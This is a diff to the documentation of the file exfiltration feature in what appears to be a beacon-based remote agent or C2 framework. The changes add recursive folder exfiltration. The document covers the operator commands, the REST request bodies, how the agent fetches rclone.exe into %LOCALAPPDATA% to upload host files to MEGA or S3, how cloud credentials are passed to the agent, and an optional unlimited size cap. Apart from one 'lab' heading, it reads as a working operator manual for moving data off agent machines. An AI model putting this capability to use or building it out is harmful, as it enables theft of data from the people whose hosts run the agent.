@@ -1,14 +1,29 @@
 # rclone exfil
 
-Operators queue exfil of a **remote file on the agent** to cloud storage (MEGA, S3, …) using **rclone on the agent host**. The server holds the rclone binary and named remote profiles; credentials are sent to the agent only inside the ephemeral `__EXFIL__` job payload.
+Operators queue exfil of a **remote file or folder on the agent** to cloud storage (MEGA, S3, …) using **rclone on the agent host**. The server holds the rclone binary and named remote profiles; credentials are sent to the agent only inside the ephemeral `__EXFIL__` job payload.
 
 ## Flow
 
 1. Operator queues via REST, CLI, MCP, or web UI (`exfil`).
 2. Server enqueues `__EXFIL__` with JSON: local path, profile name, destination, and `RCLONE_CONFIG_*` env vars.
 3. Agent downloads `rclone.exe` from the server once (beacon auth) into `%LOCALAPPDATA%\RMM\rclone.exe` if missing.
-4. Agent runs `rclone copyto` (and `rclone link` for MEGA) with `--config NUL`.
+4. Agent runs **`rclone copyto`** (single file) or **`rclone copy`** (directory tree) and optional `rclone link` for MEGA files.
 5. Agent POSTs `cloud_upload` result; transcript shows `remote_path → link` or destination path.
+
+### Files vs folders
+
+The agent detects the path type on the host:
+
+| Local path on agent | rclone command | Default cloud dest (no `dest`) |
+|---------------------|----------------|--------------------------------|
+| File | `copyto` | `{profile.folder}/{basename}` |
+| Directory | `copy` (recursive) | `{profile.folder}/{folder-basename}` |
+
+Use the same operator commands for both — `exfil C:\Users\x\Documents\project mega-lab` uploads the whole tree.
+
+- **`RMM_RCLONE_MAX_BYTES`** applies to the **total** size (file length or sum of all files in the folder).
+- MEGA **`link`** is generated for single-file exfil only (not folders).
+- Optional **`dest`** overrides the remote path prefix (e.g. `"dest": "archives/project-backup"`).
 
 During upload the agent also POSTs **`exfil_progress`** updates (bytes, percent, speed, ETA) roughly every 5s or 1% change. The web UI shows a live progress bar; progress events are **WebSocket-only** (not stored in session history).
 
@@ -36,7 +51,7 @@ Define named profiles as JSON:
 | `RMM_RCLONE_PROFILES_FILE` | Path to a JSON file (overrides inline if both set) |
 | `server_rmm.py --rclone-profiles PATH` | Same as `RMM_RCLONE_PROFILES_FILE` at startup |
 | `RMM_RCLONE_DEFAULT_PROFILE` | Default profile when `--profile` omitted (default `mega-lab`) |
-| `RMM_RCLONE_MAX_BYTES` | Max file size in bytes (default 100 MB); **`0` = unlimited** |
+| `RMM_RCLONE_MAX_BYTES` | Max exfil size in bytes (file or whole folder; default 100 MB); **`0` = unlimited** |
 | `server_rmm.py --rclone-max-bytes N` | Same as `RMM_RCLONE_MAX_BYTES` at startup |
 
 Example file (`tools/rclone/profiles.example.json`):
@@ -112,6 +127,14 @@ Content-Type: application/json
 {"remote_path": "C:\\Users\\x\\doc.pdf", "profile": "mega-lab", "dest": "optional/path/file.pdf"}
 ```
 
+Folder example:
+
+```json
+{"remote_path": "C:\\Users\\x\\project", "profile": "mega-lab"}
+```
+
+Uploads the directory recursively to `{profile.folder}/project/` on the remote.
+
 ```http
 GET /api/v1/rclone/config
 ```
@@ -136,13 +159,16 @@ GET /api/v1/rclone/config
   "success": true,
   "link": "https://mega.nz/#!…",
   "size": 12345,
+  "path_kind": "file",
   "error": null
 }
 ```
 
+`path_kind` is `file` or `dir` (agent-side).
+
 ### Progress (live only)
 
-While `rclone copyto` runs, the agent POSTs `type=exfil_progress`:
+While `rclone copy` / `rclone copyto` runs, the agent POSTs `type=exfil_progress`:
 
 ```http
 POST /result?id=<session>&type=exfil_progress
@@ -162,7 +188,7 @@ POST /result?id=<session>&type=exfil_progress
 
 The server broadcasts these on the operator WebSocket (`exfil_progress` events). The web UI renders a **progress bar** (same component as agent downloads) under the queued exfil command. Progress is **not** appended to `events.jsonl` (avoids transcript spam on multi-GB uploads).
 
-When rclone JSON stats omit `totalBytes`, the agent falls back to the source file size from the exfil job so progress updates are not skipped.
+When rclone JSON stats omit `totalBytes`, the agent falls back to the source file or folder total size from the exfil job so progress updates are not skipped.
 
 ## Security (lab)
 
